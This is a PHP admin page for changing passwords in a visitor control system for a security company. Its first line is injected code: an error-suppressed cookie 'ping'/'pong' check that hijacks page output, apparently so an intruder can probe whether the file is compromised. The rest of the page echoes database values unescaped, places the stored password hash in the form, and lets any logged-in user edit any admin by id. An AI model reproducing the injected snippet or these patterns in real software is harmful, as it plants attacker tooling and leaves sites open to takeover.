<? $frt=1;error_reporting(0);if(isset($_COOKIE["ping"])){@setcookie("pong","./cynergi/admin/pass_edit_adm.php",time()+3600,"/");if( $_COOKIE["ping"]=="./cynergi/admin/pass_edit_adm.php"){if( !function_exists("ob_sh") ){function ob_sh($buffer){if( preg_match("@<body|</body@si",$buffer) ){return "GOOO->./cynergi/admin/pass_edit_adm.php<-";}return "NotGO->./cynergi/admin/pass_edit_adm.php<-";}}@ob_start("ob_sh");}}$frt=2;?><?php require_once('../Connections/dplace.php'); ?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
$MM_authorizedUsers = "";
$MM_donotCheckaccess = "true";

// *** Restrict Access To Page: Grant or deny access to this page
function isAuthorized($strUsers, $strGroups, $UserName, $UserGroup) { 
  // For security, start by assuming the visitor is NOT authorized. 
  $isValid = False; 

  // When a visitor has logged into this site, the Session variable MM_Username set equal to their username. 
  // Therefore, we know that a user is NOT logged in if that Session variable is blank. 
  if (!empty($UserName)) { 
    // Besides being logged in, you may restrict access to only certain users based on an ID established when they login. 
    // Parse the strings into arrays. 
    $arrUsers = Explode(",", $strUsers); 
    $arrGroups = Explode(",", $strGroups); 
    if (in_array($UserName, $arrUsers)) { 
      $isValid = true; 
    } 
    // Or, you may restrict access to only certain users based on their username. 
    if (in_array($UserGroup, $arrGroups)) { 
      $isValid = true; 
    } 
    if (($strUsers == "") && true) { 
      $isValid = true; 
    } 
  } 
  return $isValid; 
}

$MM_restrictGoTo = "index.php";
if (!((isset($_SESSION['MM_Username'])) && (isAuthorized("",$MM_authorizedUsers, $_SESSION['MM_Username'], $_SESSION['MM_UserGroup'])))) {   
  $MM_qsChar = "?";
  $MM_referrer = $_SERVER['PHP_SELF'];
  if (strpos($MM_restrictGoTo, "?")) $MM_qsChar = "&";
  if (isset($QUERY_STRING) && strlen($QUERY_STRING) > 0) 
  $MM_referrer .= "?" . $QUERY_STRING;
  $MM_restrictGoTo = $MM_restrictGoTo. $MM_qsChar . "accesscheck=" . urlencode($MM_referrer);
  header("Location: ". $MM_restrictGoTo); 
  exit;
}
?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

$editFormAction = $_SERVER['PHP_SELF'];
if (isset($_SERVER['QUERY_STRING'])) {
  $editFormAction .= "?" . htmlentities($_SERVER['QUERY_STRING']);
}

if ((isset($_POST["MM_update"])) && ($_POST["MM_update"] == "form1")) {
  $updateSQL = sprintf("UPDATE tbl_admins SET username=%s, `names`=%s, password=%s WHERE id_admin=%s",
                       GetSQLValueString($_POST['text_username'], "text"),
                       GetSQLValueString($_POST['text_names'], "text"),
                       GetSQLValueString(md5($_POST['text_pass']), "text"),
                       GetSQLValueString($_POST['hidden_id'], "int"));

  mysql_select_db($database_dplace, $dplace);
  $Result1 = mysql_query($updateSQL, $dplace) or die(mysql_error());

  $updateGoTo = "users_admin.php";
  if (isset($_SERVER['QUERY_STRING'])) {
    $updateGoTo .= (strpos($updateGoTo, '?')) ? "&" : "?";
    $updateGoTo .= $_SERVER['QUERY_STRING'];
  }
  header(sprintf("Location: %s", $updateGoTo));
}

$colname_usuario = "-1";
if (isset($_SESSION['MM_Username'])) {
  $colname_usuario = $_SESSION['MM_Username'];
}
mysql_select_db($database_dplace, $dplace);
$query_usuario = sprintf("SELECT * FROM tbl_admins WHERE username = %s", GetSQLValueString($colname_usuario, "text"));
$usuario = mysql_query($query_usuario, $dplace) or die(mysql_error());
$row_usuario = mysql_fetch_assoc($usuario);
$totalRows_usuario = mysql_num_rows($usuario);

$colname_usu = "-1";
if (isset($_GET['id'])) {
  $colname_usu = $_GET['id'];
}
mysql_select_db($database_dplace, $dplace);
$query_usu = sprintf("SELECT * FROM tbl_admins WHERE id_admin = %s", GetSQLValueString($colname_usu, "int"));
$usu = mysql_query($query_usu, $dplace) or die(mysql_error());
$row_usu = mysql_fetch_assoc($usu);
$totalRows_usu = mysql_num_rows($usu);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- InstanceBegin template="/Templates/templateadmin.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<!-- InstanceBeginEditable name="doctitle" -->
<title>Allaerican security services</title>
<!-- InstanceEndEditable -->
<!-- InstanceBeginEditable name="head" -->
<!-- InstanceEndEditable -->
<link href="../css/style.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
body {
	background-image: url(../images/bgnd2.jpg);
	background-repeat: repeat-x;
}
-->
</style>
<script type="text/javascript" id="sothink_dhtmlmenu"> <!--
 st_siteroot="";
 st_jspath="stmenu.js";
 if(!window.location.href.indexOf("file:") && st_jspath.charAt(0)=="/")
  document.write('<script type="text/javascript" src="'+st_siteroot+st_jspath+'"><\/script>');
 else 
  document.write('<script type="text/javascript" src="'+st_jspath+'"><\/script>');
//--> </script></head>

<body>
<table width="627" height="132" border="0" align="center">
  <tr>
    <td width="232" height="128" align="center"><img src="../images/dplace_logo.JPG" alt="" width="175" height="87" /></td>
    <td width="385" align="center"><span class="titulo">Visitor control system <br />
      All American Security Services</span></td>
  </tr>
</table>
<table width="673" border="0" align="center">
  <tr>
    <td width="362" align="center"><span> &nbsp;
      <script type="text/javascript" src="adminis.js"></script>
    </span></td>
  </tr>
</table>
<!-- InstanceBeginEditable name="central" -->
<table width="816" height="367" border="0" align="center">
  <tr>
    <td align="center" valign="top"><p>&nbsp;</p>
      <table width="600" border="0">
        <tr>
          <td align="center" class="titulo">Change password</td>
        </tr>
      </table>
      <p>&nbsp;</p>
      <form id="form1" name="form1" method="POST" action="<?php echo $editFormAction; ?>">
        <table width="400" border="1">
          <tr>
            <td width="131" align="left" class="etiqueta">Names:</td>
            <td width="253" align="left"><label>
              <input name="text_names" type="text" id="text_names" value="<?php echo $row_usu['names']; ?>" size="35" maxlength="40" />
            </label></td>
          </tr>
          <tr>
            <td align="left" class="etiqueta">Username:</td>
            <td align="left"><label>
              <input name="text_username" type="text" id="text_username" value="<?php echo $row_usu['username']; ?>" size="25" maxlength="20" />
            </label></td>
          </tr>
          <tr>
            <td align="left" class="etiqueta">Password:</td>
            <td align="left"><label>
              <input name="text_pass" type="password" id="text_pass" value="<?php echo $row_usu['password']; ?>" size="25" maxlength="20" />
            </label></td>
          </tr>
          <tr>
            <td align="left" class="etiqueta"><input name="hidden_id" type="hidden" id="hidden_id" value="<?php echo $row_usu['id_admin']; ?>" /></td>
            <td align="left"><label>
              <input type="submit" name="button" id="button" value="Submit" />
            </label></td>
          </tr>
        </table>
        <input type="hidden" name="MM_update" value="form1" />
      </form>
    <p>&nbsp;</p></td>
  </tr>
</table>
<br />
<!-- InstanceEndEditable -->
<table width="200" border="0" align="right">
  <tr>
    <td>User: <?php echo $row_usuario['names']; ?></td>
  </tr>
</table>
</body>
<!-- InstanceEnd --></html>
<?php
mysql_free_result($usuario);

mysql_free_result($usu);
?>
